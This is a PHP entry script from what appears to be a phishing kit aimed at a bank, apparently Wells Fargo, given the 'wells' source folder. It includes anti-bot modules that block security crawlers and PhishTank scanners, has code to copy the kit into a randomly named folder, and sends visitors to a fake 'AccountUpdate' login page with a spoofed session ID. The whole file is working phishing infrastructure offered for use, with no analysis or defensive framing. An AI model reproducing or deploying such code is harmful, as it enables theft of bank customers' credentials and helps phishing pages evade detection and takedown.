<?php

session_start();

// ANITBOTS
include('BOTS/grabber.php');
include('BOTS/botlist.php');
include('BOTS/blacklist.php');
include('BOTS/iprange.php');
include('BOTS/phishtank.php');
include('BOTS/spec.php');

$random = rand(0,100000).$_SERVER['REMOTE_ADDR'];
$dst    = substr(md5($random), 0, 8);

function recurse_copy($src,$dst)
{
	$dir = opendir($src);
	@mkdir($dst);
	while(false !== ( $file = readdir($dir)) ) {
		if (( $file != '.' ) && ( $file != '..' )) {
			if ( is_dir($src . '/' . $file) ) {
				recurse_copy($src . '/' . $file,$dst . '/' . $file);
			}
			else {
				copy($src . '/' . $file,$dst . '/' . $file);
			}
		}
	}
	closedir($dir);
}

$src="wells";
/*recurse_copy( $src, $dst ); */
header("location:".$dst."");  
header("location: AccountUpdate/login/index.php?actionType=AcctLogin&LoginSession=True&SessionId=".md5(microtime())."&__ENVAR=#"); 
exit;
?>
